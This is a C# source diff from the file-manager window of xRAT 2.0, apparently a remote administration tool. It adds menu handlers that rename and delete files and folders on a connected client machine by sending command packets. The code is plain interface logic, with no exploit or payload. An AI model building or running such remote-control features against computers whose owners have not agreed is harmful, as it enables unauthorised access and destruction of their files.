@@ -154,14 +154,57 @@ namespace xRAT_2.Forms
             }
         }
 
-        private void btnOpenDLFolder_Click(object sender, EventArgs e)
+        private void ctxtRename_Click(object sender, EventArgs e)
         {
-            string downloadPath = Path.Combine(Application.StartupPath, "Clients\\" + cClient.EndPoint.Address.ToString());
+            foreach (ListViewItem files in lstDirectory.SelectedItems)
+            {
+                if (files.SubItems[0].Text != "..")
+                {
+                    string path = currentDir;
+                    string newName = files.SubItems[0].Text;
+                    bool isDir = files.Tag.ToString() == "dir";
 
-            if (Directory.Exists(downloadPath))
-                Process.Start(downloadPath);
-            else
-                MessageBox.Show("No files downloaded yet!", "xRAT 2.0 - File Manager", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                    if (path.EndsWith(@"\"))
+                        path = path + files.SubItems[0].Text;
+                    else
+                        path = path + @"\" + files.SubItems[0].Text;
+
+                    if (InputBox.Show("New name", "Enter new name:", ref newName) == System.Windows.Forms.DialogResult.OK)
+                    {
+                        if (currentDir.EndsWith(@"\"))
+                            newName = currentDir + newName;
+                        else
+                            newName = currentDir + @"\" + newName;
+
+                        if (cClient != null)
+                            new Core.Packets.ServerPackets.Rename(path, newName, isDir).Execute(cClient);
+                    }
+                }
+            }
+        }
+
+        private void ctxtDelete_Click(object sender, EventArgs e)
+        {
+            foreach (ListViewItem files in lstDirectory.SelectedItems)
+            {
+                if (files.SubItems[0].Text != "..")
+                {
+                    string path = currentDir;
+                    bool isDir = files.Tag.ToString() == "dir";
+                    string text = string.Format("Are you sure you want to delete this {0}", (isDir) ? "directory?" : "file?");
+
+                    if (path.EndsWith(@"\"))
+                        path = path + files.SubItems[0].Text;
+                    else
+                        path = path + @"\" + files.SubItems[0].Text;
+
+                    if (MessageBox.Show(text, "Are you sure?", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
+                    {
+                        if (cClient != null)
+                            new Core.Packets.ServerPackets.Delete(path, isDir).Execute(cClient);
+                    }
+                }
+            }
         }
 
         private void ctxtRefresh_Click(object sender, EventArgs e)
@@ -171,6 +214,16 @@ namespace xRAT_2.Forms
                 new Core.Packets.ServerPackets.Directory(currentDir).Execute(cClient);
                 cClient.Value.lastDirectorySeen = false;
             }
+        }
+
+        private void btnOpenDLFolder_Click(object sender, EventArgs e)
+        {
+            string downloadPath = Path.Combine(Application.StartupPath, "Clients\\" + cClient.EndPoint.Address.ToString());
+
+            if (Directory.Exists(downloadPath))
+                Process.Start(downloadPath);
+            else
+                MessageBox.Show("No files downloaded yet!", "xRAT 2.0 - File Manager", MessageBoxButtons.OK, MessageBoxIcon.Information);
         }
 
         private void lstDirectory_ColumnClick(object sender, ColumnClickEventArgs e)
